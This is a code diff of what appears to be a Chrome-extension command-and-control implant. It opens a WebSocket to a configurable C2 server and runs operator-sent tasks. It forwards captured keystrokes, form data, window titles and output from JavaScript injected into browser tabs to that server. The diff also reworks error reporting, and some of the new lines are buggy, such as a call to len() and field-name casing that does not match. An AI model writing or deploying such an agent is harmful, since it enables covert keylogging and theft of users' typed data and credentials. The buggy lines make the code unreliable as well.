@@ -20,7 +20,7 @@ class customC2 extends baseC2{
     }
 
     getConfig() {
-        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': this.commands.join(',')});
+        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': JSON.stringify(this.commands)});
     }
 
     checkIn() {
@@ -40,16 +40,6 @@ class customC2 extends baseC2{
             const msg = out.shift();
             connection.send(msg);
         }
-    }
-
-    sendError(taskid, tasktype, err) {
-        let payload = btoa(unescape(encodeURIComponent(JSON.stringify(err))));
-        let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, payload.length, taskid, tasktype, payload);
-        const meta = {};
-        meta.type = 3;
-        meta.metadata = envelope;
-        const metaenvelope = JSON.stringify(meta);
-        out.push(metaenvelope);
     }
 }
 
@@ -80,8 +70,9 @@ function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data)
 }
 
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
-const C2 = new customC2('HHHH',  PPPP, 'EEEE',  SSSS, IIII);
-const connection  = new WebSocket(C2.server);
+const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_REPLACE, INTERVAL_REPLACE);
+let server = C2.server;
+const connection  = new WebSocket(`${server}`);
 
 setInterval(function(){
     C2.postResponse();
@@ -97,7 +88,7 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
             keydata['window_title'] = message.window;
             let mtype = message.data.type;
             let payload = btoa(unescape(encodeURIComponent(JSON.stringify(keydata))));
-            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
+            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
             const meta = {};
             meta.type = 3;
             meta.metadata = envelope;
@@ -111,7 +102,7 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
             formData.keystrokes = message.data;
             let mtype = message.data.type;
             let payload = btoa(unescape(encodeURIComponent(JSON.stringify(formData))));
-            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
+            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
             const meta = {};
             meta.type = 3;
             meta.metadata = envelope;
@@ -123,7 +114,7 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
             // catch output from custom javascript injected into tabs
             let payload = btoa(unescape(encodeURIComponent(JSON.stringify(message.data))));
             let mtype = message.data.type;
-            let envelope = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, mtype, payload);
+            let envelope = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, message.data.length, keylogTaskID, mtype, payload);
             const meta = {};
             meta.type = 3;
             meta.metadata = envelope;
@@ -145,7 +136,7 @@ connection.onerror = function () {
     // Do Nothing
 };
 
-connection.onmessage = function () {
+connection.onmessage = function (e) {
     const message = JSON.parse(e.data);
 
     switch (message['metatype']) {
@@ -158,13 +149,18 @@ connection.onmessage = function () {
         case 3 : {
             // handle an apfell message
             const data = message["metadata"];
-            const taskid = data["taskid"];
-            const tasktype = data["tasktype"];
+            const taskname = data["taskname"];
 
             try {
-                C2.commands[tasktype](data['data']);
+                C2.commands[taskname](data['data']);
             } catch (err) {
-                C2.sendError(taskid, tasktype, err);
+                console.log("Error executing task: " + err);
+                const envelope = CreateApfellMessage(2, apfell.apfellid, apfell.uuid, len(err), data['taskid'], data['tasktype'], err);
+                const meta = {};
+                meta.type = 3;
+                meta.metadata = envelope;
+                const metaenvelope = JSON.stringify(meta);
+                out.push(metaenvelope);
             }
         }
     }
